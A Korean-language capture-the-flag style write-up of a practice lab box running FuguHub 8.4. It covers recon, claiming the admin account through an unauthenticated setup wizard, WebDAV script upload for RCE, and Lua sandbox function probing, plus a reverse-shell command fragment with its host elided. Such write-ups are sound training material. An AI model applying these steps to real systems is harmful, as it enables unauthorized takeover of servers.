---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/default-creds
  - tech/web/webdav
  - tech/web/file-upload
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.248.25
domain: hub.local
ports: [22, 80, 8082, 9999]
services: [http, ssh, ssl/abyss]
cves: [CVE-2023-24078, CVE-2024-27697]
status: solved
manual_tags: true
tech_count: 4
---
> [!info] PG Practice — Pentester Foundations #2
> **타겟** 192.168.248.25 · **OS** Debian 11 · **난이도** Fundamental · **플래그 1개**
> **경로 요약** 8082 FuguHub 8.4 설정마법사 미완료 → 비인증 관리자 계정 선점 → WebDAV로 `.lsp` 업로드 → `ba.exec()` → **곧바로 root**

## 0. 이 박스에서 배우는 것

- **"설정 마법사 미완료" = 관리자 계정 선점 가능** — 어플라이언스/자체호스팅 제품 전반에 반복되는 초기화 상태 결함
- **WebDAV 공유 루트와 웹 루트가 같으면 업로드가 곧 RCE** — `PUT` 한 번으로 서버측 스크립트가 심긴다
- **스크립트 샌드박스를 `pcall`로 관측하는 기법** — `io.popen`이 죽었을 때 무엇이 살아 있는지 알아내는 절차
- **버전 판정의 인식론** — 근거가 셋인데 셋 다 틀릴 수 있다. 중요한 건 **개수가 아니라 독립성**이다
- **서비스가 `User=root`로 돌면 권한상승 단계가 통째로 없다** — 셸 잡자마자 `id`를 치는 이유

> [!tip] 시험 출제 가능성
> **높다.** 다만 "FuguHub가 나온다"는 뜻이 아니라 **유형**이 나온다는 뜻이다.
> - **초기 설정 미완료 어플라이언스**: 라우터 관리 페이지, NAS 셋업, GitLab/Jenkins 초기 admin 등록, ERP 설치 마법사 — OSCP·PG에 반복 등장한다.
> - **업로드 → 서버측 스크립트 실행**: 확장자만 `.php`/`.jsp`/`.aspx`/`.lsp`로 바뀔 뿐 구조가 같다.
> - **버전 오판으로 시간을 태우는 함정**: 이게 이 박스가 주는 최대 자산이다. 시험에서 30분을 날리는 전형적 원인이다.
>
> 반대로 **CVE 번호 암기는 거의 무가치**하다. 이 박스만 해도 랩 브리핑(8.1/CVE-2023-24078)과 실제(8.4/CVE-2024-27697)가 다르지만 **악용 절차는 동일**하다.

---

## 1. 정찰

### Nmap

```bash
┌──(kali㉿kali)-[~/PG/Hub]
└─$ sudo nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.25
Nmap scan report for 192.168.248.25
Host is up (0.093s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp   open  http       nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: 403 Forbidden
8082/tcp open  http       Barracuda Embedded Web Server
| http-methods:
|_  Potentially risky methods: PROPFIND PATCH PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
|_http-server-header: BarracudaServer.com (Posix)
|_http-title: Home
| http-webdav-scan:
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PATCH, POST, PUT, COPY, DELETE, MOVE, MKCOL, PROPPATCH, LOCK, UNLOCK
|   Server Type: BarracudaServer.com (Posix)
|_  WebDAV type: Unknown
9999/tcp open  ssl/abyss?
| ssl-cert: Subject: commonName=FuguHub/stateOrProvinceName=California/countryName=US
| Subject Alternative Name: DNS:FuguHub, DNS:FuguHub.local, DNS:localhost
| Not valid before: 2019-07-16T19:15:09
|_Not valid after:  2074-04-18T19:15:09
OS details: Linux 5.0 - 5.14
Nmap done at Wed Aug 19 17:09:20 2026 -- 1 IP address (1 host up) scanned in 165.88 seconds
```

읽는 법:

- **8082 = FuguHub 본체.** `Server: BarracudaServer.com` 배너와 SSL 인증서 CN `FuguHub`가 제품을 확정한다.
- **9999 = 같은 앱의 HTTPS 리스너.** nmap이 `ssl/abyss?`로 오인했지만 `curl -k https://T:9999/`가 8082와 동일한 Home을 반환한다. `bdd.conf`의 `port=8082 / sslport=9999`가 확증.
- **`http-methods`에 `PUT`/`MKCOL`/`MOVE`** — WebDAV가 살아 있다는 신호. 업로드 RCE를 즉시 의심할 근거다.
- 80은 nginx 403이지만 **버리면 안 된다**(아래 참조).

> [!note] 명령 플래그 해설 — 왜 이 조합인가
> | 플래그 | 역할 | **빼면 어떻게 실패하나** |
> |---|---|---|
> | `-p-` | 65535 포트 전수 | 8082·9999가 기본 1000포트 밖이다. **빼면 이 박스는 22/80만 보이고 시작조차 못 한다.** 80은 403이므로 "웹 없음"으로 오판한다 |
> | `-sCV` | 기본 NSE + 버전 탐지 | `http-methods`·`http-webdav-scan`·`ssl-cert`가 전부 NSE 산출물이다. **빼면 WebDAV도 CN=FuguHub도 못 본다** |
> | `-Pn` | 호스트 디스커버리 생략 | 랩 방화벽이 ICMP를 막으면 호스트가 down으로 나온다. **빼면 "Host seems down"으로 스캔 자체가 중단** |
> | `--min-rate 5000` | 최소 초당 패킷 | 없으면 `-p-`가 수십 분. 있으면 165초 |
> | `-A` | OS/traceroute 포함 | 정보량은 늘지만 느리다. 급하면 `-p-`로 포트만 뽑고 열린 포트에만 `-sCV`를 다시 거는 2단계가 빠르다 |
>
> `ssl-cert`의 **CN·SAN은 제품 식별에 매우 강한 단서**다. `DNS:FuguHub.local`처럼 내부 도메인이 새기도 한다 — `/etc/hosts`에 등록해두면 vhost 기반 라우팅을 놓치지 않는다.

### 서비스 식별 — 버전 판정

> [!danger] `readme.txt`를 믿으면 틀린다
> 80/tcp nginx가 FuguHub 설치 디렉터리(`/var/www/html`)를 그대로 서빙해서 `readme.txt`를 읽을 수 있다. 그 선두는 이렇게 시작한다:
>
> ```
>  Changes for 8.0     July 2019
> ```
>
> SSL 인증서 `Not valid before: 2019-07-16`, 8082 인덱스 `Last-Modified: 2019-07-19`까지 **3중으로 "2019년 8.0"을 가리킨다.**
> **전부 오답이다.** 실행 중인 제품은 **8.4**다. 배포본에 딸려온 changelog가 갱신되지 않았을 뿐이다.

인증 후 `/rtl/about.lsp`가 앱 스스로 렌더한 값이 최종 근거다:

```bash
┌──(kali㉿kali)-[~/PG/Hub]
└─$ curl -s -u admin:password http://192.168.248.25:8082/rtl/about.lsp | grep -i fuguhub
<h2>FuguHub 8.4</h2>
<p>FuguHub is free to use for non-commercial or educational use...
```

> [!tip] 버전 증거의 신뢰 순위
> 1. **앱이 런타임에 렌더하는 About/버전 페이지** ← 최상위
> 2. 서버 헤더 / API가 반환하는 버전 필드 ([[Crane]]의 `get_server_info`가 이 예)
> 3. 패키지 메타데이터 (`composer.json` 등)
> 4. **정적 파일의 changelog·readme** ← 최하위. **갱신 안 된 잔존물일 수 있다.**
>
> 리소스 해시(favicon, 로고)도 무용지물이었다 — 8.0과 8.4가 바이트 동일이라 구분이 안 된다.

랩 브리핑은 이 박스를 **8.1 / CVE-2023-24078**이라고 안내하는데 실제 버전은 8.4다. 다만 **악용 메커니즘은 동일**하다 — `/Config-Wizard/wizard/SetAdmin.lsp` 무인증 노출 → 관리자 선점 → WebDAV `.lsp` 업로드 → RCE. 이 체인은 8.1의 CVE-2023-24078(EDB 51550)과 8.4의 CVE-2024-27697이 공유하는 결함이다. **CVE 번호를 맞히는 것보다 메커니즘을 아는 것이 실전에서 중요하다.**

> 버전 판정이 왜 3중으로 틀렸는지, 그리고 그것을 사전에 막는 절차는 **[2-6](#2-6-버전-판정의-인식론--근거의-개수가-아니라-독립성)** 에서 따로 깊게 다룬다. 이 박스의 최대 학습 자산이다.

### 무인증 접근 표면

| 경로 | 코드 | 비고 |
|---|---|---|
| `/` | 200 | "Configuration Wizard must be completed" 배너 |
| **`/Config-Wizard/`** | 302 → `SetAdmin.lsp` | **무인증** |
| **`/Config-Wizard/wizard/SetAdmin.lsp`** | 200 | **무인증 — 진입점** |
| `/rtl/about.lsp` | 200 | 버전 확인 |
| `/blog/`, `/photos.html`, `/Contact-Us.html` | 200 | CMS 공개 페이지 |
| `/rtl/protected/*` | 401 | realm `FuguHub` |
| `/fs/` | 401 | realm `Web File Server` (WebDAV) |
| `/private/`, `/private/manage/` | 401 | realm `Content Management System` |

```bash
┌──(kali㉿kali)-[~/PG/Hub]
└─$ curl -i -X OPTIONS http://192.168.248.25:8082/
HTTP/1.1 200 OK
Server: BarracudaServer.com (Posix)
Allow: OPTIONS, GET, HEAD, PROPFIND, PATCH, POST, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
DAV: 1, 2
MS-Author-Via: DAV
```

> [!note] 401 realm 문자열을 읽어라 — 접근제어 지도가 공짜로 나온다
> `WWW-Authenticate: Basic realm="..."` 의 realm 값이 **세 개로 갈린다**: `FuguHub` · `Web File Server` · `Content Management System`.
> 이것은 서버가 **디렉터리별로 별도의 인증 구성**을 붙였다는 뜻이다. BarracudaServer는 아파치식 `.htaccess`류 파일로 디렉터리 단위 realm을 정의한다 `[가정 — 실측한 것은 realm 문자열이 셋으로 갈렸다는 사실뿐이다]`.
>
> 실전적 함의는 둘이다:
> 1. **realm이 갈리면 "인증이 붙은 디렉터리 목록"을 그린 것**이다. 그 목록에 **없는** 경로가 무인증 표면이다 — 위 표에서 `/Config-Wizard/`가 그렇게 튀어나왔다.
> 2. **하나의 자격증명이 모든 realm에 통한다는 보장이 없다.** 여기서는 `admin:password`가 세 realm 전부에 통했지만, 갈리는 제품도 있다. 401이 계속 나오면 "비밀번호가 틀렸다"가 아니라 **"realm이 다르다"** 를 먼저 의심한다.
>
> ```bash
> curl -sI http://TARGET:PORT/path | grep -i www-authenticate
> ```

### 80/tcp — 403이라고 넘기면 안 되는 이유

루트 인덱스는 403이지만 **문서 루트가 `/var/www/html`, 즉 FuguHub 설치 디렉터리 그 자체**다. 파일명을 직접 때리면 읽힌다.

```
/readme.txt                      200  18730   ← (함정) 8.0 changelog
/LICENSE.txt                     200  87
/user.dat                        200  467     ← FuguHub 사용자 DB
/bdd.conf                        200  56      ← 포트 설정
/applications/Config-Wizard.zip  200  71872
/applications/ /data/ /disk/ /themes/ /cache/ /trace/   403 (autoindex 꺼짐)
```

```bash
┌──(kali㉿kali)-[~/PG/Hub]
└─$ curl -s http://192.168.248.25/bdd.conf
drivedir="/var/www/html/cmsdocs"
port=8082
sslport=9999
```

`user.dat`은 FuguHub 자체 암호화 포맷이라 평문 해시가 아니다(크랙 불가). 그래도 **설치 경로 확정**과 **셸 획득 후 드롭한 파일을 80으로 회수**하는 용도로 쓸 수 있다.

> [!tip] `403 Forbidden`은 "볼 것 없음"이 아니다
> 디렉터리 인덱싱만 꺼져 있고 **파일 자체는 서빙되는** 경우가 흔하다. 파일명 워드리스트로 다시 긁어야 한다.
> 여기서는 `-x txt,conf,dat,zip` 계열 확장자가 결정적이었다.

> [!danger] 확장자 화이트리스트를 좁게 잡으면 설정 파일이 통째로 안 보인다
> 아래 feroxbuster는 `-x php,txt,html,lsp`로 돌렸다. **이 목록에 `conf`·`dat`이 없다.**
> 그래서 이 박스의 핵심 정보 유출인 `bdd.conf`(설치 경로·포트)와 `user.dat`(사용자 DB)은 **그 스캔 결과에 존재하지 않는다.** 별도로 확장자를 넓혀 다시 긁어서야 나왔다.
>
> 웹 앱 정찰에서 확장자 목록은 **언어 확장자 + 설정/데이터 확장자** 두 묶음으로 나눠 생각한다:
>
> | 묶음 | 확장자 | 노리는 것 |
> |---|---|---|
> | 언어 | `php,asp,aspx,jsp,lsp,py,cgi,pl` | 실행 가능한 엔드포인트 |
> | **설정·데이터** | **`conf,cfg,ini,env,json,yml,yaml,xml,dat,db,sql,bak,old,zip,tar.gz,log`** | 자격증명·경로·버전 |
>
> **`json`이 빠지는 실수가 특히 잦다.** `package.json`·`composer.json`·`manifest.json`·`config.json`·`.well-known/*.json`은 **버전 판정 2순위 근거**(패키지 메타데이터)의 주 서식지다. 이 박스는 그 계층이 애초에 없어서(C 바이너리 제품) 버전 판정이 어려웠던 것이기도 하다.
>
> 실전 규칙: **1차는 좁게 빠르게, 2차는 설정·데이터 확장자로 다시.** 1차만 돌리고 넘어가면 이 박스처럼 설치 경로를 통째로 놓친다.

### feroxbuster — 9999는 통째로 위양성

```bash
┌──(kali㉿kali)-[~/PG/Hub]
└─$ feroxbuster -u http://192.168.248.25:8082/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,lsp -t 100 -o ferox_8082.log
200      GET      147l      606w     6924c http://192.168.248.25:8082/
200      GET       67l      449w     4973c http://192.168.248.25:8082/Contact-Us.html
401      GET        1l        2w       21c http://192.168.248.25:8082/rtl/protected/admin/
401      GET        1l        2w       21c http://192.168.248.25:8082/rtl/protected/wfslinks.lsp
```

> [!note] 플래그 해설
> | 플래그 | 역할 | 빼면 |
> |---|---|---|
> | `-w raft-medium-directories.txt` | 디렉터리 중심 워드리스트 | `directory-list-2.3-medium`보다 노이즈가 적다. 시간이 없으면 `raft-small`부터 |
> | `-x php,txt,html,lsp` | 확장자 부착 | **`lsp`를 빼면** 이 제품의 실행 가능 엔드포인트를 못 본다. 제품이 확정되면 **그 제품의 확장자를 반드시 추가**한다 |
> | `-t 100` | 동시 스레드 | 임베디드 웹서버는 100이면 뻗기도 한다. 응답이 이상해지면 낮춘다 |
> | `-o ferox_8082.log` | 결과 저장 | 시험에서는 필수. 재실행 비용이 크다 |
> | **누락된 `-C 302`** | 상태코드 필터 | **이걸 안 걸어서 9999 스캔이 통째로 쓰레기가 됐다** (아래) |

> [!warning] BarracudaServer는 존재하지 않는 경로에도 302를 준다
> 9999 스캔에서 `/2009`, `/App_Data`, `/fileadmin`, `/downloader`, `/openx` 등 302가 50건 넘게 나왔는데 **전부 가짜**다.
> 확인법 — 아무 문자열이나 던져본다:
>
> ```bash
> └─$ curl -s -o /dev/null -w "%{http_code}\n" http://192.168.248.25:9999/nonexistent-abc123
> 302
> ```
>
> **스캔 시작 전에 존재할 리 없는 경로를 한 번 때려서 서버의 "없음" 응답이 뭔지 확정**하고 그 코드를 필터(`-C 302`)하는 습관을 들일 것.

---

## 2. 취약점 분석

> [!abstract] 이 장에서 답할 질문
> 1. 왜 초기 설정이 안 끝난 어플라이언스는 **구조적으로** 관리자 선점에 취약한가
> 2. `SetAdmin.lsp`에 인증이 없는 것이 왜 "실수"가 아니라 **설계상 필연**인가
> 3. 왜 페이로드가 `email=...&user=...&password=...` **그 세 필드**인가
> 4. WebDAV 업로드가 어떤 조건에서 **RCE로 승격**되는가
> 5. Lua 샌드박스에서 **살아 있는 API를 어떻게 찾아내는가**
> 6. 왜 3중으로 일치한 버전 근거가 **전부 틀렸는가**

### 2-1. 배경 지식 — 초기 설정 상태 머신

자체호스팅 제품·어플라이언스는 대부분 아래 상태 머신을 갖는다.

```
[설치 직후]  관리자 없음
     │
     │  누구든 접근 가능한 설치/설정 마법사
     ▼
[설정 중]    관리자 계정 생성 요청 대기        ← 여기가 무인증 창구
     │
     │  POST (email, user, password)
     ▼
[운영]       관리자 존재 → 마법사 폐쇄, 전 경로 인증 요구
```

핵심은 **`[설정 중]` 상태에서는 인증을 요구할 수 없다는 점**이다. 아직 계정이 하나도 없으니 인증할 대상 자체가 없다. 즉 **무인증 설정 창구는 버그가 아니라 이 설계의 필연**이다.

> [!note] 그럼 정상 제품은 어떻게 방어하나
> 진짜 결함은 "무인증 창구가 있다"가 아니라 **"그 창구가 네트워크에 노출된 채 방치됐다"** 이다. 제대로 만든 제품은 셋 중 하나를 쓴다:
>
> | 방어 | 예 |
> |---|---|
> | **로컬 전용 바인딩** — 설정이 끝날 때까지 `127.0.0.1`에만 리슨 | 여러 DB 설치 마법사 |
> | **설치 토큰** — 디스크의 파일(`/var/lib/.../initialAdminPassword`)을 읽어야 진행 | Jenkins |
> | **시간 창** — 부팅 후 N분 안에만 설정 허용 | 일부 라우터 |
> | **원격 IP 제한** — 콘솔/LAN 인터페이스에서만 | 다수 NAS |
>
> 이 박스는 **아무것도 없다.** 8082/9999가 전 인터페이스에 열려 있고, 상태는 여전히 `[설정 중]`이다. 그래서 인터넷의 누구든 `[운영]` 상태로 넘기는 트리거를 당길 수 있다.

> [!tip] 이 유형을 알아보는 신호 — 시험 반사
> 페이지에 아래 문구가 보이면 **다른 것 다 제쳐두고 먼저 잡는다**:
> - "Configuration Wizard must be completed" / "Setup is not complete"
> - "Create the first admin account" / "Initial setup"
> - "Welcome! Let's get started" 류의 온보딩
> - 로그인 폼이 있는데 **비밀번호 재설정·가입 링크가 비정상적으로 열려 있음**
>
> 확인 명령은 한 줄이다 — **리다이렉트를 따라가서 어디로 던져지는지 본다**:
> ```bash
> curl -s -o /dev/null -w '%{http_code} -> %{redirect_url}\n' http://TARGET:PORT/
> curl -s -i http://TARGET:PORT/ | head -40 | grep -iE 'wizard|setup|install|first|admin'
> ```
> 흔한 설정 경로 후보: `/setup`, `/install`, `/install.php`, `/wizard`, `/Config-Wizard/`, `/admin/setup`, `/initial`, `/onboarding`, `/setup.cgi`.

### 2-2. 왜 취약한가 — `SetAdmin.lsp`의 데이터 흐름

무인증 창구가 열려 있다는 것은 확인됐다. 그럼 그 창구가 정확히 무엇을 하는가.

```
POST /Config-Wizard/wizard/SetAdmin.lsp
     body: email=... & user=... & password=...
       │
       ▼
  [ SetAdmin.lsp ]
       │  ① "관리자가 이미 있는가?" 검사
       │       └─ 검사 대상: /var/www/html/user.dat 파일의 존재
       │  ② 없으면 → 사용자 DB 생성
       ▼
  /var/www/html/user.dat  (FuguHub 자체 암호화 포맷)
       │
       ▼
  이후 모든 realm(FuguHub / Web File Server / CMS)의 인증 주체가 됨
```

취약점의 정체는 **"인증 검사"가 "상태 검사"로 대체된 것**이다.

| | 정상 설계 | 이 제품 |
|---|---|---|
| 무엇을 검사하나 | **요청자가 누구인가**(인증) | **서버가 어떤 상태인가**(파일 존재 여부) |
| 공격자가 통제 가능한가 | 아니오 — 자격증명이 필요 | **예 — 상태를 먼저 바꾸면 된다** |
| 결과 | 관리자만 관리자를 만듦 | **가장 먼저 POST한 사람이 관리자** |

여기서 두 번째 결함이 겹친다: **생성된 계정이 세 realm 전부의 주체가 된다.** 즉 "설정 마법사의 관리자"와 "파일 서버의 사용자"가 분리돼 있지 않다. 그래서 계정 하나가 곧바로 **WebDAV 쓰기 권한**으로 이어진다 — 이게 이 박스가 한 방에 끝나는 이유다.

> [!danger] 이 공격은 **선착순**이다
> 상태 머신은 한 방향으로만 간다. `[설정 중]` → `[운영]`으로 넘어가면 되돌릴 수 없다.
> **관리자 계정이 이미 만들어져 있으면 이 경로는 통째로 죽는다.** 실전 침투에서 이 표면을 발견했는데 이미 잠겨 있다면, 그건 "다른 사람이 먼저 잡았거나" "관리자가 설정을 마쳤거나" 둘 중 하나다.
> **발견 즉시 잡아라.** 정찰을 마저 하고 돌아오는 사이에 사라질 수 있는 유일한 종류의 취약점이다.

### 2-3. 왜 이 페이로드인가

```
email=admin@hub.local&user=admin&password=password
```

세 필드밖에 없다. 각 조각의 역할:

| 조각 | 역할 | 틀리면 |
|---|---|---|
| `user=admin` | **HTTP Basic 인증의 사용자명이 된다.** 이후 모든 `-u` 값의 앞부분 | 아무 값이나 가능. 다만 로그에서 눈에 띄지 않게 하려면 평범한 이름 |
| `password=password` | Basic 인증 비밀번호 | 마찬가지로 자유. **단 정책 검증에 걸리면 400/에러** — 짧거나 단순해서 거부되면 대문자·숫자·기호를 섞어 재시도 |
| `email=admin@hub.local` | 계정 메타데이터 | **비어 있으면 폼 검증에 걸릴 수 있다.** 도메인은 `nmap`/인증서에서 얻은 `hub.local`을 쓰면 자연스럽다 |

> [!note] 필드 이름은 어떻게 알아내나 — 소스가 없을 때의 절차
> `.lsp`는 서버측에서 실행되므로 **소스를 직접 못 읽는다.** 그래도 필드 이름은 얻을 수 있다:
>
> 1. **폼을 렌더한 HTML을 받아서 `<input name=...>` 를 긁는다** — 가장 확실하다.
>    ```bash
>    curl -s http://TARGET:8082/Config-Wizard/wizard/SetAdmin.lsp | grep -oiE 'name="[^"]+"'
>    ```
> 2. **`<form action=` 와 `method=` 를 함께 본다** — POST 대상 경로가 자기 자신인지 다른 경로인지 확인. 이 박스는 **자기 자신에게 POST**한다.
> 3. **브라우저 DevTools 네트워크 탭** — 실제로 한 번 제출해서 요청 바디를 그대로 복사. 시험에서도 허용된다.
> 4. **애플리케이션 배포본을 얻어 읽는다** — 이 박스는 80에서 `/applications/Config-Wizard.zip`(71872바이트)이 그대로 다운로드된다. **설정 마법사의 소스가 통째로 노출돼 있다.**
>
> 4번이 정석 순서다: *공개된 아카이브가 보이면 폼을 추측하기 전에 그걸 먼저 받아라.*

> [!warning] `-d` vs `--data-urlencode` — 언제 무엇을 쓰나
> - `-d 'a=1&b=2'` : **이미 인코딩된 문자열**을 그대로 보낸다. `&`가 필드 구분자로 해석된다.
> - `--data-urlencode 'a=값'` : 값에 든 `&`·공백·`'`·`"`·`(`·`)`를 curl이 인코딩한다.
>
> 이 단계(`SetAdmin.lsp`)는 값에 특수문자가 없어 `-d`로 충분하다.
> 반면 **3장의 명령 실행 단계는 반드시 `--data-urlencode`** 다 — `c=bash -i >& /dev/tcp/...` 에는 공백·`&`·`>`가 들어 있어 `-d`로 보내면 **`&` 지점에서 파라미터가 잘려 명령이 반토막 난다.** 이게 "왜 명령이 안 먹히지" 하며 시간을 태우는 대표적 원인이다.
>
> `-i`(응답 헤더 포함)를 붙이는 이유도 명확하다. 이 제품은 **성공/실패를 본문 문구로만 알려주고 상태 코드는 200으로 고정**이다. 헤더와 본문을 함께 봐야 판정이 된다 — [[Crane]]·[[Hawat]]에서 반복된 "응답이 성공을 뜻하지 않는다" 패턴이다.

### 2-4. WebDAV 업로드가 RCE로 승격되는 조건

`PUT`이 된다고 전부 RCE가 되지는 않는다. **네 조건이 동시에 맞아야** 한다.

| # | 조건 | 이 박스에서의 상태 | 확인 방법 |
|---|---|---|---|
| 1 | `PUT`/`MKCOL`이 실제로 허용 | ✅ `OPTIONS`에 `PUT` 존재, 실측 `201 Created` | `curl -i -X OPTIONS` → 실제로 `-T`로 던져본다 |
| 2 | **업로드 경로가 웹으로 다시 서빙됨** | ✅ `/fs/x.lsp` → `GET /x.lsp` | 무해한 텍스트 파일을 올리고 GET으로 회수 |
| 3 | **업로드된 확장자가 서버측에서 실행됨** | ✅ `.lsp`가 Lua Server Pages로 실행 | **산술식 테스트**(아래) |
| 4 | 확장자·MIME 필터가 없음 | ✅ 필터 없음 | `.txt` → `.lsp` 순으로 올려 비교 |

**2번이 가장 자주 깨진다.** WebDAV 공유가 `/var/dav/`처럼 웹 루트 **밖**을 가리키면 파일은 올라가지만 실행되지 않는다. 이 박스는 Web-File-Server의 공유 루트가 **웹 루트와 동일**해서 성립했다.

> [!tip] 2단계 검증 — 한 번에 리버스셸부터 던지지 마라
> ```
> ① 업로드가 되는가            → 201/204 확인
> ② 다시 읽히는가              → GET으로 회수
> ③ 서버측에서 실행되는가       → 무해한 산술식 (7*7 → 49)
> ④ 명령이 실행되는가           → id
> ⑤ 리버스셸
> ```
> 리버스셸부터 던지면 **안 붙었을 때 원인이 5개 중 어디인지 모른다.** 업로드 실패? 실행 안 됨? 방화벽? 포트? — 한 번에 5개 가설을 안게 된다.
> **`7*7 → 49`가 곱셈인 이유**: `7+7=14`, `77`처럼 문자열 연결과 헷갈리는 결과를 피하려는 관용이다. `49`는 입력 어디에도 나타나지 않으므로 **에코가 아니라 실행**임이 확정된다.

### 2-5. Lua 샌드박스 — 무엇이 죽었고 무엇이 살아 있는가

LSP(Lua Server Pages)는 `<?lsp ... ?>` 안의 Lua를 서버에서 실행한다. PHP의 `<?php ?>`, JSP의 `<% %>`와 같은 계열이다.

교과서적인 Lua 웹셸은 이렇게 쓴다:

```lua
local h = io.popen("id"); response:write(h:read("*a"))
```

그런데 FuguHub의 LSP 런타임은 **`io` 테이블에서 `popen`을 제거**해뒀다. 호출하면 이렇게 죽는다:

```
field 'popen' is not callable
```

> [!note] 이 에러 문구를 정확히 읽어라
> - `attempt to call a nil value (field 'popen')` / `field 'popen' is not callable` → **함수가 아예 없다.** 샌드박스가 걷어냈다는 뜻.
> - `attempt to index a nil value (global 'io')` → **`io` 테이블 자체가 없다.** 더 강한 샌드박스.
> - `permission denied` / 빈 출력 → **함수는 있는데 OS·정책 레벨에서 막힌다.** AppArmor·seccomp·`open_basedir` 계열을 의심.
>
> 셋은 대응이 다르다. **첫 번째는 "다른 API를 찾아라", 세 번째는 "다른 실행 주체를 찾아라"** 다. 에러 문구를 대충 보고 "샌드박스라서 안 되네"로 뭉뚱그리면 잘못된 방향으로 간다.

핵심 기법은 **`pcall`로 감싸 에러를 응답에 노출시키는 것**이다.

```lua
local ok, err = pcall(function() return <시험할 표현식> end)
response:write(tostring(ok) .. " | " .. tostring(err))
```

`pcall`(protected call)은 Lua의 예외 처리다. 감싸지 않으면 에러가 500으로 튀어 **본문이 빈 응답**이 오고, 무엇이 왜 실패했는지 모른다. 감싸면 **실패 이유가 HTTP 본문으로 돌아온다.** 이것이 샌드박스를 "관측"하는 장치다.

> [!tip] 살아 있는 API 관측 루틴 — 다른 언어에도 그대로 적용된다
> 존재 여부와 호출 가능 여부를 **한 번에 훑는다**:
> ```lua
> <?lsp
> local cand = {"os.execute","os.getenv","io.popen","io.open","ba.exec",
>               "ba.openio","require","loadstring","dofile"}
> for _,n in ipairs(cand) do
>   local ok, v = pcall(load("return " .. n))
>   response:write(n .. " = " .. tostring(ok) .. "/" .. type(v) .. "\n")
> end
> ?>
> ```
> 같은 발상의 타 언어 버전:
> - **PHP**: `phpinfo()`의 `disable_functions`, 없으면 `foreach(['system','exec','shell_exec','passthru','popen','proc_open'] as $f) echo $f.'='.(function_exists($f)?'Y':'N');`
> - **Python**: `__builtins__` 덤프, `os`/`subprocess` import 시도
> - **Java/JSP**: `Runtime.getRuntime()` vs `ProcessBuilder` — SecurityManager 유무
>
> **원칙: 막혔을 때 "안 되네"로 끝내지 말고, 무엇이 남아 있는지 목록으로 뽑아라.** 샌드박스는 벽이 아니라 체다.

FuguHub에서 살아 있는 것은 **Barracuda 런타임의 `ba` 네임스페이스**다. `ba.exec()`가 명령을 실행하고 **stdout을 문자열로 되돌려준다**.

> [!danger] 제품 고유 API가 표준 API보다 강할 수 있다
> 샌드박스 설계자는 보통 **표준 라이브러리의 위험 함수**를 지운다 — `io.popen`, `os.execute`.
> 그런데 **자기 제품이 추가한 확장 API**는 지우는 것을 잊는다. `ba.exec`가 정확히 그 경우다.
> **일반화: 임베디드/전용 런타임을 만나면 그 제품의 API 문서(또는 배포본의 `.lua`/`.js` 파일)를 뒤져 "실행"·"프로세스"·"파일" 계열 함수를 찾아라.** 표준 함수가 막혔다는 사실은 오히려 "커스텀 API는 안 막혔다"의 힌트다.

### 2-6. 버전 판정의 인식론 — 근거의 개수가 아니라 독립성

이 박스가 남긴 가장 값진 교훈이다. **근거 3개가 서로 일치했는데 3개 다 틀렸다.**

| # | 근거 | 값 | 가리킨 결론 |
|---|---|---|---|
| ① | `readme.txt` 첫 줄 | `Changes for 8.0   July 2019` | 8.0 / 2019 |
| ② | SSL 인증서 `Not valid before` | `2019-07-16T19:15:09` | 2019 |
| ③ | 8082 인덱스 `Last-Modified` | `2019-07-19` | 2019 |
| — | **실제** | `/rtl/about.lsp` | **8.4** |

세 근거가 일치했으니 신뢰도가 높아 보인다. **틀렸다.** 셋은 **같은 뿌리에서 나온 하나의 근거**다:

```
                  2019년에 만들어진 FuguHub 배포 아카이브
                  (readme.txt · 자체서명 인증서 · 정적 파일들)
                             │
        ┌────────────────────┼────────────────────┐
        ▼                    ▼                    ▼
   ① readme.txt        ② SSL 인증서 날짜     ③ Last-Modified
        └────────────── 전부 "아카이브가 만들어진 시점" ──┘
                             │
                    실행 중인 바이너리 버전과 무관
```

배포본은 2019년에 패키징됐고, 이후 버전 업그레이드에서 **바이너리만 교체되고 부속 정적 파일은 그대로 남았다.** 셋 다 "아카이브 생성 시점"이라는 **동일한 사실**을 세 각도에서 본 것일 뿐이다. **독립 증거가 하나도 없었다.**

> [!danger] 증거의 독립성 검사 — 시험장에서 쓸 30초 절차
> 근거를 나열한 뒤 각각에 대해 묻는다:
>
> 1. **"이 값을 누가, 언제 만들었나?"**
>    - 빌드/패키징 시점에 고정 → **정적 증거**. 런타임 버전과 무관할 수 있다
>    - 요청을 받고 그 자리에서 생성 → **동적 증거**. 실행 중인 코드가 만든 것이다
> 2. **"이 근거들이 같은 파일·같은 아카이브·같은 배포에서 왔나?"**
>    - 예 → **근거 1개다.** 개수를 세지 마라
> 3. **"이 값이 업그레이드 때 갱신되나?"**
>    - 갱신 안 됨(readme·인증서·정적 파일 mtime) → **최하위 신뢰도**
>
> **결론: "여러 근거가 일치한다"는 신뢰의 근거가 아니다. "서로 다른 생성 경로를 가진 근거가 일치한다"가 신뢰의 근거다.**

동적(런타임) 증거를 얻는 실전 수단:

| 수단 | 명령 | 비고 |
|---|---|---|
| **About/버전 페이지** | `curl -s -u U:P http://T:P/rtl/about.lsp \| grep -i <제품명>` | 최상위. 인증이 필요할 때가 많으므로 **자격증명 확보 후 즉시** 확인 |
| API 버전 필드 | `/api/version`, `/status.php`, `/api/v1/info`, `/actuator/info` | JSON이므로 **`-x json` 을 안 걸면 fuzz에 안 잡힌다** |
| 에러 페이지 지문 | 존재하지 않는 경로/잘못된 파라미터로 스택트레이스 유도 | 프레임워크 버전이 새기도 함 |
